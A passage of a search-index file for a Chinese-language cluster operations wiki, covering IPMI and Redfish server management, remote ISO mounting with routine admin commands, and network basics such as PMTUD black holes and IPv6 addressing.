\u5e74\u63a8\u51fa\u4ee5\u6765\uff0c\u51e0\u4e4e\u6240\u6709\u91cd\u8981\u7684\u5927\u5382\u90fd\u5df2\u7ecf\u5f00\u542f\u4e86\u201c\u7ea2\u9c7c\u201d\u4e4b\u65c5\u3002\u5982 Dell \u5728\u5176 iRAC \u4e2d\u52a0\u5165\u4e86 RedFish\uff0cSuperMicro \u5f15\u5165\u4e86 RedFish\u3002\u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0c\u56fd\u4ea7\u4e4b\u5149\u7684\u534e\u4e3a\u670d\u52a1\u5668\u7684 iBMC \u4e2d\u4e5f\u5168\u9762\u652f\u6301\u4e86 RedFish\uff0c\u56fd\u4ea7 BIOS \u548c BMC \u9886\u519b\u4f01\u4e1a\u767e\u6556\u8f6f\u4ef6\u81ea\u7814 BMC \u4e2d\u4e5f\u5168\u9762\u652f\u6301\u4e86 RedFish\u3002\u6700\u540e\u8981\u591a\u8bf4\u4e00\u53e5\uff0cRedFish \u548c IPMI \u5e76\u4e0d\u77db\u76fe\uff0c\u5f88\u591a\u73b0\u6709 BMC \u540c\u65f6\u652f\u6301 IPMI 2.0 \u548c RedFish\uff0c\u6709\u4e9b\u751a\u81f3\u5728 IPMI \u4e0a\u5305\u88c5\u4e86\u4e00\u5c42 RedFish \u754c\u9762\u3002\u5168\u9762\u6dd8\u6c70 IPMI \u8fd8\u9700\u65f6\u65e5\uff0c\u540c\u65f6\u652f\u6301\u4e24\u8005\u4e5f\u4fdd\u8bc1\u4e86\u8fc7\u6e21\u7684\u5e73\u6ed1\u6027\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/oobm/#\u8bbf\u95ee-ipmi-\u754c\u9762","title":"\u8bbf\u95ee IPMI \u754c\u9762","text":"<p>\u96c6\u7fa4\u670d\u52a1\u5668\u7684 IPMI \u754c\u9762\u7684\u57df\u540d\u4e3a <code>&lt;node_name&gt;-ipmi.clusters.zjusct.io</code>\u3002\u6bd4\u5982 <code>root</code> \u8282\u70b9\u7684 IPMI \u754c\u9762\u4e3a <code>root-ipmi.clusters.zjusct.io</code>\u3002IPMI \u8d26\u5bc6\u6258\u7ba1\u5728 VaultWarden \u4e2d\u3002</p> <p>\u5927\u90e8\u5206\u5382\u5546 IPMI \u754c\u9762\u90fd\u6709\u5e2e\u52a9\u624b\u518c\u53ef\u4ee5\u67e5\u770b\u3002\u5373\u4f7f\u6ca1\u6709\uff0c\u64cd\u4f5c\u5e94\u8be5\u4e5f\u662f\u5341\u5206\u76f4\u89c2\u7684\uff0c\u8fd9\u91cc\u4e0d\u8fdb\u884c\u4ecb\u7ecd\u3002</p> <p>\u8bf7\u81ea\u884c\u63a2\u7d22\u4e0b\u5217\u529f\u80fd\uff1a</p> <ul> <li>\u67e5\u770b\u670d\u52a1\u5668\u7684\u786c\u4ef6\u4fe1\u606f</li> <li>\u4f7f\u7528 KVM \u6216\u63a7\u5236\u53f0\u91cd\u5b9a\u5411\u529f\u80fd\u8fdc\u7a0b\u63a7\u5236\u670d\u52a1\u5668</li> <li>\u63a7\u5236\u670d\u52a1\u5668\u7684\u7535\u6e90</li> <li>\u63a7\u5236\u670d\u52a1\u5668\u7684\u98ce\u6247\u8f6c\u901f</li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/oobm/#\u8fdc\u7a0b\u6302\u8f7d\u955c\u50cf","title":"\u8fdc\u7a0b\u6302\u8f7d\u955c\u50cf","text":"<p>\u8fdc\u7a0b\u7ba1\u7406\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7 IPMI \u6302\u8f7d\u672c\u5730/\u8fdc\u7a0b\u7684 ISO \u955c\u50cf\u5230\u670d\u52a1\u5668\u4e0a\uff0c\u4ece\u800c\u8fdc\u7a0b\u5b89\u88c5\u64cd\u4f5c\u7cfb\u7edf\u3002</p> <p>IPMI \u754c\u9762\u4e2d\u53ef\u80fd\u6709\u4e24\u5904\u5730\u65b9\u53ef\u4ee5\u627e\u5230\u8fdc\u7a0b\u6302\u8f7d\u955c\u50cf\uff1a</p> <ul> <li> <p>\u9009\u9879\u5361\u4e2d\u7684\u201c\u8fdc\u7a0b\u955c\u50cf\u201d\uff1a</p> <p>\u4e0d\u540c\u5382\u5546\u7684 IPMI \u652f\u6301\u4e0d\u540c\u7684\u6302\u8f7d\u65b9\u5f0f\uff0c\u4e00\u822c\u4e3a HTTP \u6216 NFS\u3002</p> <p></p>      \u65b0\u534e\u4e09 IPMI \u955c\u50cf\u6302\u8f7d\u9009\u9879\u5361      <p></p> <p>\u8fdc\u7a0b\u6302\u8f7d\u955c\u50cf\u63a8\u8350\u6302\u8f7d\u5c0f\u955c\u50cf</p> <p>\u5efa\u8bae\u6302\u8f7d\u5982 Debian netinst \u955c\u50cf\uff08\u7ea6 600MB \u5de6\u53f3\uff09\u3002\u5982\u679c\u5fc5\u987b\u6302\u8f7d\u5927\u955c\u50cf\uff08\u5982 Ubuntu \u57fa\u7840\u955c\u50cf\u5728 2GB \u4ee5\u4e0a\uff09\uff0c\u5c3d\u91cf\u5728\u540c\u4e00\u4e2a\u5c40\u57df\u7f51\u5185\u653e\u7f6e HTTP \u670d\u52a1\u5668\u5e76\u6302\u8f7d\u3002</p> <p>\u4f7f\u7528 HTTP \u670d\u52a1\u5668</p> <p>Python \u5185\u7f6e\u7684 HTTP \u670d\u52a1\u5668\u5b9e\u73b0\u4e0d\u5b8c\u5584\uff0c\u670d\u52a1\u5668 IPMI \u65e0\u6cd5\u6302\u8f7d\u955c\u50cf\uff0c\u6bd4\u5982\u8d85\u5fae\uff1a</p> <pre><code>python3 -m http.server 8000\n</code></pre> <p>\u66f4\u63a8\u8350\u4f7f\u7528 Nginx Docker\uff1a</p> <pre><code>docker run -p 8000:80 -v /path/to/iso:/usr/share/nginx/html nginx\n</code></pre> </li> <li> <p>KVM \u8fdc\u7a0b\u63a7\u5236\u9875\u9762\u53f3\u4e0a\u89d2\u53ef\u80fd\u6709\u201c\u6302\u8f7d\u955c\u50cf\u201d\u6309\u94ae\uff1a</p> <p></p>      \u6d6a\u6f6e KVM \u955c\u50cf\u6302\u8f7d\u6309\u94ae      <p></p> </li> </ul> <p>\u5b8c\u6210\u6302\u8f7d\u540e\uff0c\u8fdb\u5165\u542f\u52a8\u83dc\u5355\uff0c\u5e94\u8be5\u80fd\u770b\u5230\u6302\u8f7d\u7684\u955c\u50cf\u3002\u4e00\u822c\u662f AMI: Virtual CD/DVD ROM \u7b49\u9009\u9879\u3002</p> <p>\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5177\u4f53\u7684\u4f8b\u5b50\uff1a</p> <p>\u5b81\u7545</p> <p>root \u662f\u5b81\u7545 IPMI\u3002\u8fdb\u5165 BMC Settings - Media Redirection\uff0c\u5728 Function settings \u9009\u9879\u5361\u4e2d\u52fe\u9009 Remote Media Support\uff0c\u5c31\u4f1a\u51fa\u73b0\u8fdc\u7a0b\u6302\u8f7d\u7684\u9009\u9879\u3002\u586b\u5199\u4f8b\u5982\u4e0b\uff1a</p> <ul> <li>Server Address for CD/DVD Images: <code>192.168.1.1</code></li> <li>Path in server:<code>/home/user/download</code></li> </ul> <p>\u6ce8\u610f Path \u4e0d\u5e94\u5f53\u5199\u6587\u4ef6\u540d\uff0c\u5e94\u8be5\u5199\u76ee\u5f55\u540d\u3002Save \u540e\u5207\u6362\u5230 Remote Media \u9009\u9879\u5361\u5373\u53ef\u9009\u62e9\u9700\u8981\u6302\u8f7d\u7684\u955c\u50cf\uff0c\u4ec5\u80fd\u626b\u63cf\u8be5\u76ee\u5f55\u4e0b\u7684 <code>.iso</code> \u6587\u4ef6\uff0c\u4e0d\u652f\u6301\u9012\u5f52\u641c\u7d22\u3002\u9009\u62e9\u540e\u70b9\u51fb\u53f3\u4fa7\u56fe\u6807\u6302\u8f7d\u3002</p> <p>\u65b0\u534e\u4e09</p> <p>\u65b0\u534e\u4e09\u53ea\u652f\u6301 NFS/CIFS \u6302\u8f7d\u3002\u9700\u8981\u5b89\u88c5 Ubuntu\uff0c\u4f46 Ubuntu \u6ca1\u6709 netinst \u5305\u3002\u5982\u679c\u4f7f\u7528 KVM \u6302\u8f7d\uff0c\u4f20\u8f93\u901f\u5ea6\u6781\u6162\u3002\u4f60\u8981\u662f\u613f\u610f\u7b49\uff0c\u5e76\u4e14\u7f51\u7edc\u72b6\u6001\u7a33\u5b9a\uff0c\u53ef\u4ee5\u6162\u6162\u5b8c\u6210\u5b89\u88c5\u8fc7\u7a0b\u3002\u4f46\u8fdc\u7a0b\u7ba1\u7406\u7684\u7f51\u7edc\u72b6\u51b5\u4e00\u822c\u4e0d\u592a\u7a33\u5b9a\uff0c\u955c\u50cf\u5bb9\u6613\u4e0a\u4f20\u5230\u4e00\u534a\u65ad\u6389\u3002</p> <p>\u66f4\u5efa\u8bae\u901a\u8fc7 KVM \u6302\u8f7d\u6781\u5c0f\u7684 iPXE \u6216 netboot.xyz \u955c\u50cf\u4f5c\u4e3a\u8df3\u677f\uff0c\u5f15\u5bfc\u8fdb\u5165 Linux \u5b89\u88c5\u7a0b\u5e8f\u540e\u4ee4\u5176\u81ea\u884c\u4e0b\u8f7d\u5927\u955c\u50cf\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/oobm/#\u4f7f\u7528-ipmitool","title":"\u4f7f\u7528 <code>ipmitool</code>","text":"<p> <code>ipmitool</code> \u662f\u4e00\u4e2a IPMI \u547d\u4ee4\u884c\u5de5\u5177\uff0c\u4f46\u5b83\u76ee\u524d\u5df2\u7ecf\u8fdb\u5165 Public Archive \u72b6\u6001\uff0c\u4e0d\u518d\u7ef4\u62a4\u3002</p> <p>\u76ee\u524d\uff0c\u6211\u4eec\u4f7f\u7528\u5b83\u5236\u4f5c\u4e00\u4e9b\u96c6\u7fa4\u64cd\u4f5c\u7684\u81ea\u52a8\u5316\u811a\u672c\uff0c\u4f8b\u5982\uff1a</p> ipmi.sh<pre><code>#!/bin/bash\nfor host in ${hosts[@]}\ndo\n  ipmitool -I lanplus -H $host -U $(bw get username $host) -P $(bw get password $host) chassis power $1\ndone\n</code></pre> <p>\u811a\u672c\u89c1  ZJU Git\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/oobm/#redfish","title":"Redfish","text":"<p>Quote</p> <ul> <li>Introduction to Redfish - DMTF\uff1aDMTF \u5165\u95e8 Presentation\uff0c\u666e\u53ca\u57fa\u7840\u6982\u5ff5\u3002</li> </ul> <p>IPMI \u5b9e\u73b0 IPMI over LAN\uff0c\u4f7f\u7528 Remote Management Control Protocol\uff08RMCP\uff09\u5c01\u88c5 IPMI \u6d88\u606f\uff0c\u901a\u8fc7 UDP \u4e0e\u670d\u52a1\u5668 623 \u7aef\u53e3\u901a\u4fe1\u3002\u4f8b\u5982\uff0c\u4e0b\u9762\u662f\u4f7f\u7528 Wireshark \u6293\u53d6\u7684 IPMI over LAN \u901a\u4fe1\u8fc7\u7a0b\uff1a</p> <pre><code>Src    Dst    Proto Info\nClient Server IPMB  Session ID 0x0\nServer Client IPMB  Session ID 0x0\nClient Server IPMB  Session ID 0x0, payload type: IPMI Message\nClient Server RMCP+ Session ID 0x0, payload type: RMCP+ Open Session Request\nServer Client RMCP+ Session ID 0x0, payload type: RMCP+ Open Session Response\nClient Server RMCP+ Session ID 0x0, payload type: RAKP Message 1\nClient Server RMCP+ Session ID 0x48422efa, payload type: IPMI Message\n</code></pre> <p>\u8be5\u534f\u8bae\u53ef\u8bfb\u6027\u5f88\u5dee\uff0c\u9700\u8981\u4f7f\u7528\u4e13\u95e8\u7684\u5de5\u5177\u89e3\u6790\u3002\u800c Redfish \u7528\u4e00\u53e5\u8bdd\u603b\u7ed3\u5c31\u662f HTTPS in JSON format based on OData v4\uff0c\u4f7f\u7528 RESTful API\uff0c\u66f4\u52a0\u76f4\u89c2\u6613\u7528\uff0c\u9002\u914d\u73b0\u4ee3 Web \u5f00\u53d1\u3002\u4f8b\u5982\uff0c\u8bbf\u95ee\u652f\u6301 Redfish \u7684\u670d\u52a1\u5668\u7684\u5e26\u5916\u7ba1\u7406\u5730\u5740\u4e0b\u7684 <code>/redfish/v1</code>\uff0c\u5c31\u80fd\u5f97\u5230 JSON \u683c\u5f0f\u7684\u6570\u636e\uff08\u5df2\u622a\u65ad\uff09\uff1a</p> GET https://***.***.***.***/redfish/v1<pre><code>{\n    \"@odata.context\": \"/redfish/v1/$metadata#ServiceRoot.ServiceRoot\",\n    \"@odata.id\": \"/redfish/v1/\",\n    \"@odata.type\": \"#ServiceRoot.v1_5_2.ServiceRoot\",\n    \"Id\": \"RootService\",\n    \"Name\": \"Root Service\",\n    \"Oem\": {\n        \"Public\": {\n            \"ManagementIPv4\": \"***.***.***.***\",\n            \"Manufacturer\": \"IEIT SYSTEMS\",\n            \"Model\": \"SA5212-M7-A0-R0-00\",\n            \"SerialNumber\": \"********\"\n        }\n    },\n    \"RedfishVersion\": \"1.13.0\",\n    \"AccountService\": {\n        \"@odata.id\": \"/redfish/v1/AccountService\"\n    },\n    \"Chassis\": {\n        \"@odata.id\": \"/redfish/v1/Chassis\"\n    },\n}\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/network/","title":"\u7f51\u7edc\u8fd0\u7ef4","text":"","tags":["stable"]},{"location":"operation/network/#\u7f51\u7edc\u8fd0\u7ef4","title":"\u7f51\u7edc\u8fd0\u7ef4","text":"<p>\u5728\u7b14\u8005\u770b\u6765\uff0c\u7f51\u7edc\u8fd0\u7ef4\u4e4b\u6240\u4ee5\u88ab\u79f0\u4e3a\u7384\u5b66\uff0c\u4e3b\u8981\u6709\u4e24\u4e2a\u539f\u56e0\uff1a</p> <ul> <li> <p>\u7f51\u7edc\u901a\u4fe1\u9886\u57df\u77e5\u8bc6\u548c\u6280\u672f\u7e41\u6742\uff0c\u6d89\u53ca\u7684\u9886\u57df\u5e7f\u6cdb\u3002\u80fd\u6cdb\u6cdb\u5730\u4e86\u89e3\u5404\u79cd\u6280\u672f\u5df2\u7ecf\u5f88\u4e0d\u9519\uff0c\u66f4\u522b\u63d0\u6df1\u5165\u638c\u63e1\u4e86\u3002</p> \u4f8b\u5b50\uff1aTCP \u534f\u8bae <p>\u4e0b\u9762\u8fd9\u6bb5\u4ecb\u7ecd\u6765\u81ea\u300aTCP/IP \u8be6\u89e3\uff1a\u5377 1\u300b \uff0c\u53ef\u4ee5\u770b\u5230\u9664\u4e86\u6700\u539f\u59cb\u7684\u4e00\u4efd\u89c4\u8303\u6587\u4ef6\u5916\uff0c\u8fd8\u6709\u975e\u5e38\u591a\u4e0e\u5b9e\u8df5\u76f8\u5173\u7684\u8865\u5145\u5b9a\u4e49\u3002\u4ec5\u4e00\u4e2a TCP \u534f\u8bae\uff0c\u5c31\u9700\u8981\u5341\u591a\u4efd RFC \u6765\u5b9a\u4e49\uff0c\u53ef\u4ee5\u770b\u51fa\u7f51\u7edc\u901a\u4fe1\u6280\u672f\u7684\u590d\u6742\u6027\u3002</p> <p>The original specification for TCP is [RFC0793], although some errors in that RFC are corrected in the Host Requirements RFC, [RFC1122]. Since then, specifications for TCP have been revised and extended to include clarified and improved congestion control behavior [RFC5681][RFC3782][RFC3517][RFC3390][RFC3168], retransmission timeouts [RFC6298][RFC5682][RFC4015], operation with NATs [RFC5382], acknowledgment behavior [RFC2883], security [RFC6056][RFC5927][RFC5926], connection management [RFC5482], and urgent mechanism implementation guidelines [RFC6093]. There have also been a rich variety of experimental modifications covering retransmission behaviors [RFC5827][RFC3708], congestion detection and control [RFC5690][RFC5562][RFC4782][RFC3649][RFC2861], and other features. Finally, there is an effort to explore how TCP might take advantage of multiple simultaneous network-layer paths [RFC6182].</p> </li> <li> <p>\u5177\u4f53\u7684\u5b9e\u73b0\u548c\u7f51\u7edc\u8bbe\u5907\u3001\u534f\u8bae\u3001\u6280\u672f\u7b49\u76f8\u5173\uff0c\u90fd\u662f\u7531\u5382\u5546\u63d0\u4f9b\u7684\uff0c\u4e0d\u540c\u5382\u5546\u7684\u8bbe\u5907\u3001\u534f\u8bae\u3001\u6280\u672f\u7b49\u90fd\u6709\u6240\u4e0d\u540c\u3002\u9664\u4e86\u57fa\u672c\u7684\u539f\u7406\u548c\u6982\u5ff5\uff0c\u5f88\u591a\u4e1c\u897f\u90fd\u662f\u5177\u4f53\u95ee\u9898\u5177\u4f53\u5206\u6790\u3002</p> \u4f8b\u5b50\uff1a\u7f51\u7edc\u8bbe\u5907\u7684\u64cd\u4f5c\u7cfb\u7edf <ul> <li>\u534e\u4e3a\u3001\u601d\u79d1\u3001\u534e\u4e09\u7b49\u4f20\u7edf ICT \u5382\u5546\u5e7f\u6cdb\u91c7\u7528\u547d\u4ee4\u884c\u754c\u9762\uff0c\u5f62\u6210\u4e86\u4e00\u5957\u56fa\u5b9a\u7684\u601d\u8def\u3002\u5bf9\u4e8e\u8fd9\u4e9b\u5382\u5546\u7684\u8bbe\u5907\uff0c\u53ea\u80fd\u786c\u7740\u5934\u76ae\u5b66\u4e60\u547d\u4ee4\u884c\u64cd\u4f5c\uff0c\u4f7f\u7528 Web \u7ba1\u7406\u53ea\u4f1a\u8e29\u5751\u3002</li> <li>Mikrotik \u7b49\u65b0\u5174\u5382\u5546\u7684\u7cfb\u7edf\u53c8\u662f\u53e6\u4e00\u5957\u601d\u8def\u3002\u4ed6\u4eec\u5c06\u66f4\u591a\u7684\u7ec6\u8282\u63d0\u4f9b\u5230\u56fe\u5f62\u754c\u9762\u4e2d\uff0c\u4e00\u5b9a\u7a0b\u5e8f\u4e0a\u964d\u4f4e\u4e86\u5b66\u4e60\u6210\u672c\uff0c\u540c\u65f6\u63d0\u4f9b\u4e86\u9ad8\u5ea6\u7684\u53ef\u5b9a\u5236\u6027\u3002</li> <li>TP-Link \u7b49\u5382\u5546\u7684\u4ea7\u54c1\u9762\u5411\u5bb6\u5ead\u7528\u6237\uff0c\u66f4\u591a\u7684\u662f\u63d0\u4f9b\u7b80\u5355\u6613\u7528\u7684\u754c\u9762\u3002\u5bf9\u4e8e\u7f51\u7edc\u8fd0\u7ef4\u4eba\u5458\u6765\u8bf4\uff0c\u8fd9\u4e9b\u8bbe\u5907\u7684\u529f\u80fd\u548c\u53ef\u81ea\u5b9a\u4e49\u7a0b\u5ea6\u90fd\u662f\u4e0d\u591f\u7684\u3002</li> </ul> \u4f8b\u5b50\uff1a\u9ed1\u6d1e\u95ee\u9898 <p>RFC 2923 - TCP Problems with Path MTU Discovery \u63d0\u53ca\u4e86 MTU \u53d1\u73b0\u6280\u672f\u56e0\u4e3a\u914d\u7f6e\u4e0d\u5f53\u53ef\u80fd\u4ea7\u751f\u7684\u9ed1\u6d1e\u95ee\u9898\u3002\u8fd9\u4e2a\u95ee\u9898\u5728\u6211\u4eec\u7684\u8fd0\u7ef4\u8fc7\u7a0b\u4e2d\u771f\u5b9e\u5730\u53d1\u751f\u4e86\uff08\u53c2\u89c1 \u7f51\u7edc\u6280\u672f\u4e13\u9898/L2TP#MTU \u8c03\u4f18\u3002RFC 2923 \u5bf9\u8be5\u95ee\u9898\u7684\u8bc4\u4ef7\u662f\u201c\u975e\u5e38\u96be\u4ee5\u8c03\u8bd5\u201d\uff1a</p> <p>This failure is especially difficult to debug, as pings and some interactive TCP connections to the destination host work.  Bulk transfers fail with the first large packet and the connection eventually times out.</p> <p>This problem has been discussed extensively on the tcp-impl mailing list;  the name \"black hole\" has been in use for many years.</p> <p>\u7b80\u5355\u6765\u8bf4\uff0c\u4e3b\u673a\u901a\u8fc7\u8bbe\u7f6e\u201c\u7981\u6b62\u5206\u7247\u201d\u6807\u5fd7\u4f4d\u5e76\u53d1\u9001\u5c3d\u53ef\u80fd\u5927\u7684\u6570\u636e\u5305\u6765\u6267\u884c\u8def\u5f84 MTU \u53d1\u73b0\u3002\u5982\u679c\u6570\u636e\u5305\u8fc7\u5927\uff0c\u8def\u7531\u5668\u4f1a\u8fd4\u56de\u201c\u76ee\u6807\u4e0d\u53ef\u8fbe - \u9700\u8981\u5206\u7247\u201d\u7684 ICMP \u6d88\u606f\uff0c\u4e3b\u673a\u6839\u636e\u8be5\u6d88\u606f\u8c03\u6574\u6570\u636e\u5305\u5927\u5c0f\u3002\u7136\u800c\uff0c\u7531\u4e8e\u8def\u7531\u5668\u53ef\u80fd\u5b58\u5728\u5185\u6838\u6f0f\u6d1e\u6216\u914d\u7f6e\u95ee\u9898\uff0cICMP \u6d88\u606f\u53ef\u80fd\u65e0\u6cd5\u6b63\u786e\u53d1\u9001\uff0c\u5c24\u5176\u662f\u9632\u706b\u5899\u53ef\u80fd\u4f1a\u963b\u6b62\u8fd9\u4e9b\u6d88\u606f\u3002\u8fd9\u6837\u4f1a\u5bfc\u81f4\u8def\u5f84 MTU \u53d1\u73b0\u5931\u8d25\uff0c\u4e3b\u673a\u65e0\u6cd5\u5f97\u77e5\u9700\u8981\u51cf\u5c0f\u6570\u636e\u5305\u5927\u5c0f\uff0c\u5bfc\u81f4\u6570\u636e\u5305\u5728\u7f51\u7edc\u4e2d\u4e22\u5931\uff0c\u5f62\u6210\u201cPMTUD \u9ed1\u6d1e\u201d\u3002\u539f\u6587\u5982\u4e0b\uff1a</p> <p>A host performs Path MTU Discovery by sending out as large a packet as possible, with the Don't Fragment (DF) bit set in the IP header.  If the packet is too large for a router to forward on to a particular link, the router must send an ICMP Destination Unreachable -- Fragmentation Needed message to the source address. The host then adjusts the packet size based on the ICMP message.</p> <p>As was pointed out in [RFC1435], routers don't always do this correctly -- many routers fail to send the ICMP messages, for a variety of reasons ranging from kernel bugs to configuration problems.  Firewalls are often misconfigured to suppress all ICMP messages.  IPsec [RFC2401] and IP-in-IP [RFC2003] tunnels shouldn't cause these sorts of problems, if the implementations follow the advice in the appropriate documents.</p> <p>PMTUD, as documented in [RFC1191], fails when the appropriate ICMP messages are not received by the originating host.  The upper- layer protocol continues to try to send large packets and, without the ICMP messages, never discovers that it needs to reduce the size of those packets.  Its packets are disappearing into a PMTUD black hole.</p> </li> </ul> <p>\u5b66\u4e60\u5efa\u8bae</p> <p>\u907f\u514d CSDN \u7b49\u5185\u5bb9\u8d28\u91cf\u8f83\u4f4e\u7684\u7f51\u7ad9\uff0c\u5c3d\u91cf\u9605\u8bfb\u4f18\u8d28\u6587\u6863\u548c\u4e66\u7c4d\uff0c\u4e3a\u81ea\u5df1\u642d\u8d77\u4e00\u4e2a\u5b8c\u5584\u7684\u77e5\u8bc6\u6846\u67b6\u3002\u77e5\u8bc6\u6846\u67b6\u5b8c\u6210\u540e\uff0c\u53ef\u4ee5\u8fdb\u4e00\u6b65\u9605\u8bfb\u6587\u6863\u548c\u535a\u5ba2\u7b49\uff0c\u4ee5\u586b\u5145\u7ec6\u8282\u3002</p> <p>\u63a8\u8350\u9605\u8bfb\u7684\u4e66\u7c4d\uff1a</p> \u4e2d\u6587\u540d \u82f1\u6587\u540d TCP/IP \u8be6\u89e3 TCP/IP Illustrated \u8ba1\u7b97\u673a\u7f51\u7edc\uff1a\u81ea\u9876\u5411\u4e0b\u65b9\u6cd5 Computer Networking: A Top-Down Approach <p>\u8fd9\u4e9b\u4e66\u7c4d\u5927\u591a\u63cf\u8ff0\u975e\u5e38\u57fa\u7840\u7684\u7f51\u7edc\u6280\u672f\uff0c\u5bf9\u4e8e\u7406\u89e3\u7f51\u7edc\u7684\u57fa\u672c\u539f\u7406\u975e\u5e38\u6709\u5e2e\u52a9\u3002\u4f46\u8fd0\u7ef4\u5de5\u4f5c\u4e2d\uff0c\u57fa\u7840\u77e5\u8bc6\u5e76\u4e0d\u5e38\u7528\uff0c\u66f4\u591a\u662f\u5e94\u7528\u76f8\u5173\u3002\u5bf9\u4e8e\u7f51\u7edc\u6280\u672f\u7684\u5e94\u7528\uff0c\u63a8\u8350\u9605\u8bfb\u601d\u79d1\u3001\u534e\u4e3a\u3001\u65b0\u534e\u4e09\u7b49 ICT \u5382\u5546\u7684\u4ecb\u7ecd\u6587\u6863\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/","title":"IPv6","text":"","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#ipv6","title":"IPv6","text":"<p>Quote</p> <ul> <li>\u534e\u4e3a\u6587\u6863</li> </ul> <p>IPv6 \u662f\u4e0b\u4e00\u4ee3\u4e92\u8054\u7f51\u534f\u8bae\u3001\u4e92\u8054\u7f51\u7684\u53d1\u5c55\u65b9\u5411\uff0c\u53d7\u5230\u56fd\u5bb6\u91cd\u89c6\uff0c\u5728\u56fd\u5185\u63a8\u5e7f\u548c\u5e94\u7528\u5df2\u7ecf\u8fbe\u5230\u4e00\u5b9a\u89c4\u6a21\u3002\u6d59\u6c5f\u5927\u5b66\u6821\u56ed\u7f51\u4e5f\u90e8\u7f72\u4e86 IPv6\uff0c\u6821\u56ed\u7f51\u4e0d\u540c\u533a\u57df\u5b58\u5728 SLAAC \u6216 DHCPv6 \u914d\u7f6e\u65b9\u5f0f\uff0c\u4f46\u5747\u6ca1\u6709\u4e0b\u53d1\u524d\u7f00\uff0c\u4f7f\u5f97\u7528\u6237\u63a5\u5165\u7684\u8def\u7531\u5668\u65e0\u6cd5\u6b63\u5e38\u4f7f\u7528 IPv6 \u529f\u80fd\uff08\u76ee\u524d\u652f\u6301 NATv6 \u7684\u8def\u7531\u5668\u8f83\u5c11\uff09\uff0c\u56e0\u6b64\u96c6\u7fa4\u5185\u90e8\u4e5f\u6ca1\u6709\u914d\u7f6e IPv6\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#ipv6-\u539f\u7406","title":"IPv6 \u539f\u7406","text":"","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#ipv6-\u5730\u5740","title":"IPv6 \u5730\u5740","text":"<p>IPv6 \u5730\u5740\u5206\u4e3a\u5355\u64ad\u5730\u5740\u3001\u4efb\u64ad\u5730\u5740\uff08Anycast Address\uff09\u3001\u7ec4\u64ad\u5730\u5740\u4e09\u79cd\u7c7b\u578b\u3002</p> <ul> <li> <p>\u5355\u64ad\u5730\u5740\uff1a\u6807\u8bc6\u4e86\u4e00\u4e2a\u63a5\u53e3\uff0c\u7531\u4e8e\u6bcf\u4e2a\u63a5\u53e3\u5c5e\u4e8e\u4e00\u4e2a\u8282\u70b9\uff0c\u56e0\u6b64\u6bcf\u4e2a\u8282\u70b9\u7684\u4efb\u4f55\u63a5\u53e3\u4e0a\u7684\u5355\u64ad\u5730\u5740\u90fd\u53ef\u4ee5\u6807\u8bc6\u8fd9\u4e2a\u8282\u70b9\u3002\u53d1\u5f80\u5355\u64ad\u5730\u5740\u7684\u62a5\u6587\uff0c\u7531\u6b64\u5730\u5740\u6807\u8bc6\u7684\u63a5\u53e3\u63a5\u6536\u3002</p> <ul> <li>\u672a\u6307\u5b9a\u5730\u5740\uff1aIPv6 \u4e2d\u7684\u672a\u6307\u5b9a\u5730\u5740\u5373 <code>0:0:0:0:0:0:0:0/128</code> \u6216\u8005 <code>::/128</code>\u3002\u8be5\u5730\u5740\u53ef\u4ee5\u8868\u793a\u67d0\u4e2a\u63a5\u53e3\u6216\u8005\u8282\u70b9\u8fd8\u6ca1\u6709 IP \u5730\u5740\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u67d0\u4e9b\u62a5\u6587\u7684\u6e90 IP \u5730\u5740\uff08\u4f8b\u5982\u5728 NS \u62a5\u6587\u7684\u91cd\u590d\u5730\u5740\u68c0\u6d4b\u4e2d\u4f1a\u51fa\u73b0\uff09\u3002\u6e90 IP \u5730\u5740\u662f <code>::</code> \u7684\u62a5\u6587\u4e0d\u4f1a\u88ab\u8def\u7531\u8bbe\u5907\u8f6c\u53d1\u3002</li> <li>\u73af\u56de\u5730\u5740\uff1aIPv6 \u4e2d\u7684\u73af\u56de\u5730\u5740\u5373 <code>0:0:0:0:0:0:0:1/128</code> \u6216\u8005 <code>::1/128</code>\u3002\u73af\u56de\u4e0e IPv4 \u4e2d\u7684<code>127.0.0.1</code>\u4f5c\u7528\u76f8\u540c\uff0c\u4e3b\u8981\u7528\u4e8e\u8bbe\u5907\u7ed9\u81ea\u5df1\u53d1\u9001\u62a5\u6587\u3002\u8be5\u5730\u5740\u901a\u5e38\u7528\u6765\u4f5c\u4e3a\u4e00\u4e2a\u865a\u63a5\u53e3\u7684\u5730\u5740\uff08\u5982 Loopback \u63a5\u53e3\uff09\u3002\u5b9e\u9645\u53d1\u9001\u7684\u6570\u636e\u5305\u4e2d\u4e0d\u80fd\u4f7f\u7528\u73af\u56de\u5730\u5740\u4f5c\u4e3a\u6e90 IP \u5730\u5740\u6216\u8005\u76ee\u7684 IP \u5730\u5740\u3002</li> <li> <p>\u5168\u7403\u5355\u64ad\u5730\u5740</p> <p></p> <ul> <li>\u5168\u7403\u5355\u64ad\u5730\u5740\u662f\u5e26\u6709\u5168\u7403\u5355\u64ad\u524d\u7f00\u7684 IPv6 \u5730\u5740\uff0c\u5176\u4f5c\u7528\u7c7b\u4f3c\u4e8e IPv4 \u4e2d\u7684\u516c\u7f51\u5730\u5740\u3002\u8fd9\u79cd\u7c7b\u578b\u7684\u5730\u5740\u5141\u8bb8\u8def\u7531\u524d\u7f00\u7684\u805a\u5408\uff0c\u4ece\u800c\u9650\u5236\u4e86\u5168\u7403\u8def\u7531\u8868\u9879\u7684\u6570\u91cf\u3002</li> <li>\u5168\u7403\u5355\u64ad\u5730\u5740\u7531\u5168\u7403\u8def\u7531\u524d\u7f00\uff08Global routing prefix\uff09\u3001\u5b50\u7f51 ID\uff08Subnet ID\uff09\u548c\u63a5\u53e3\u6807\u8bc6\uff08Interface ID\uff09\u7ec4\u6210\u3002<ul> <li>Global routing 